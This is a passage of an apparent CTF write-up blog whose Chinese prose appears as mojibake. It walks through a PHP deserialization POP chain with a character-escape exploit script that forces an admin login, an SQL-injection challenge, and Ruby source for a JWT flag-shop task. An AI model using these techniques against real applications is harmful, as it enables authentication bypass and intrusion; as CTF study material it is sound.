function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sql</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">dbCtrl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$database</span><span class="token operator">=</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hostname</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbuser</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbpass</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$idResult</span><span class="token punctuation">,</span> <span class="token variable">$passwordResult</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$idResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ç”¨æˆ·ä¸å­˜åœ¨!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token variable">$passwordResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'å¯†ç é”™è¯¯ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">//è¿˜æ²¡æ¥å¾—åŠå†™</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//update.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;html>&lt;meta charset="utf-8">&lt;title>update&lt;/title>&lt;h2>è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2>&lt;/html>'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$users</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$users</span><span class="token operator">-></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°update.phpä¸­ä¸è®ºsessionçš„åˆ¤æ–­ç»“æœå¦‚ä½•éƒ½ä¼šæ‰§è¡Œç±»ä¸­updateæ–¹æ³•ï¼Œå¹¶ä¸”å¦‚æœæƒ³è·å–flagå°±éœ€è¦è®©<code>$_SESSION[&#39;login&#39;]===1</code>æˆ–è€…<code>$_SESSION[&#39;token&#39;]===&#39;admin&#39;</code></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class dbCtrl&#123;        public function login($sql)    &#123;        $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo(&#39;ç”¨æˆ·ä¸å­˜åœ¨!&#39;);            return false;        &#125;        if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123;            echo(&#39;å¯†ç é”™è¯¯ï¼&#39;);            return false;        &#125;        $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name;        return $idResult;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°å…¶ä¸­å¯ä»¥å¯¹tokenè¿›è¡Œä¿®æ”¹ï¼Œè€ŒåæŸ¥çœ‹è°ƒç”¨é“¾</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class Info&#123;    public function __call($name,$argument)&#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#x2F;&#x2F;CtrlCase&#x3D;new dbCtrl;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Infoä¸­çš„<code>__call</code>æ–¹æ³•èƒ½è°ƒç”¨<code>login</code>æ–¹æ³•</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class User&#123;    public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);&#x2F;&#x2F;nikename&#x3D;new Info;        return &quot;0-0&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Userä¸­çš„<code>__toString</code>æ–¹æ³•è°ƒç”¨<code>__call</code>æ–¹æ³•</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">Class UpdateHelper&#123;    public function __destruct()    &#123;        echo $this-&gt;sql;&#x2F;&#x2F;sql&#x3D;new User;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é“¾å­ï¼š<code>UpdateHepler::__destruct()-&gt;User::__toString-&gt;Info::__Call()-&gt;dbCtrl::login()</code></p><p>ä¸‹ä¸€æ­¥å°±æ˜¯æ„é€ payloadäº†ï¼Œååºåˆ—åŒ–æ‰€ä½¿ç”¨çš„æ–¹æ³•æ˜¯</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">public function update()&#123;    $Info&#x3D;unserialize($this-&gt;getNewinfo());&#125;public function getNewInfo()&#123;    $age&#x3D;$_POST[&#39;age&#39;];    $nickname&#x3D;$_POST[&#39;nickname&#39;];    return safe(serialize(new Info($age,$nickname)));&#125;function safe($parm)&#123;    $array&#x3D; array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);    return str_replace($array,&#39;hacker&#39;,$parm);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äºé¢˜ä¸­å…ˆå¯¹ä¼ å…¥å‚é‡è¿›è¡Œinfoåºåˆ—åŒ–è€Œåå†é€šè¿‡safeå‡½æ•°è¿›è¡Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥æœ€ç»ˆé“¾å­å…¶å®å˜æˆäº†<code>Info::ä»»æ„å‚é‡=UpdateHepler::__destruct()-&gt;User::__toString-&gt;Info::__Call()-&gt;dbCtrl::login()</code>ï¼Œå¹¶ä¸”è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦é€ƒé€¸çš„åºåˆ—åŒ–</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//exp.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string single-quoted-string">'select "1","c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">UpdateHelper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">dbCtrl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$database</span><span class="token operator">=</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$feng</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">-></span><span class="token property">sql</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">-></span><span class="token property">sql</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">-></span><span class="token property">sql</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">95</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>";s:8:"nickname";N;s:8:"CtrlCase";O:12:"UpdateHelper":1:&#123;s:3:"sql";O:4:"User":3:&#123;s:2:"id";s:1:"1";s:3:"age";s:72:"select "1","c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":9:&#123;s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";N;s:4:"feng";N;&#125;&#125;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ å…¥ageï¼Œä»»æ„å¯†ç ç™»å½•adminå³å¯</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-19">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-19</a> 00.37.26.png)</p><h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>æŠ“åŒ…éšä¾¿ç‚¹ä¸€ä¸ªä¸œè¥¿ï¼Œå‘ç°ä¼ å‚ï¼Œæµ‹è¯•æ˜¯sqlæ³¨å…¥</p><p>sqlmapå’Œæ‰‹åŠ¨æ³¨å…¥éƒ½å¯ä»¥ï¼Œå‘ç°å½“å‰æ•°æ®åº“ä¸‹æ²¡æœ‰ç»“æœï¼Œåœ¨å¦å¤–ä¸€ä¸ª<code>alien_code</code>æ•°æ®åº“ä¸­</p><p>æœ€ç»ˆpayload</p><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p>æœ¬æ¥ä»¥ä¸ºæ˜¯jwtç›´æ¥ç ´è§£æˆ–ä¼ªé€ ï¼Œæ²¡æƒ³åˆ°æ˜¯ä»£ç å®¡è®¡ï¼Œæˆ‘è¿˜ä¸è®¤è¯†//////////ï¼Œæ˜¯rubyçš„æ¨¡ç‰ˆæ³¨å…¥ï¼Œåœ¨robots.txtä¸­èƒ½çœ‹åˆ°æºä»£ç ä½ç½®</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/cookies'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/json'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'jwt'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'securerandom'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'erb'</span></span>set <span class="token symbol">:public_folder</span><span class="token punctuation">,</span> <span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-literal"><span class="token string">'/static'</span></span><span class="token constant">FLAGPRICE</span> <span class="token operator">=</span> <span class="token number">1000000000000000000000000000</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> SecureRandom<span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>configure <span class="token keyword">do</span>  enable <span class="token symbol">:logging</span>  file <span class="token operator">=</span> <span class="token class-name">File</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-literal"><span class="token string">'/../log/http.log'</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"a+"</span></span><span class="token punctuation">)</span>  file<span class="token punctuation">.</span>sync <span class="token operator">=</span> <span class="token boolean">true</span>  use Rack<span class="token double-colon punctuation">::</span>CommonLogger<span class="token punctuation">,</span> file<span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/"</span></span> <span class="token keyword">do</span>  redirect <span class="token string-literal"><span class="token string">'/shop'</span></span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/filebak"</span></span> <span class="token keyword">do</span>  content_type <span class="token symbol">:text</span>  erb <span class="token builtin">IO</span><span class="token punctuation">.</span>binread __FILE__<span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/api/auth"</span></span> <span class="token keyword">do</span>  payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token symbol">uid</span><span class="token operator">:</span> SecureRandom<span class="token punctuation">.</span>uuid <span class="token punctuation">,</span> <span class="token symbol">jkl</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span>  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode payload<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>  cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/api/info"</span></span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>  json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">uid</span><span class="token operator">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"uid"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token symbol">jkl</span><span class="token operator">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/shop"</span></span> <span class="token keyword">do</span>  erb <span class="token symbol">:shop</span><span class="token keyword">end</span>get <span class="token string-literal"><span class="token string">"/work"</span></span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>  auth <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span>    <span class="token keyword">if</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex-literal"><span class="token regex">/[0-9a-z]+/</span></span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>      puts <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"FLAG"</span></span><span class="token punctuation">]</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> is working"</span></span> <span class="token keyword">then</span>    auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> SecureRandom<span 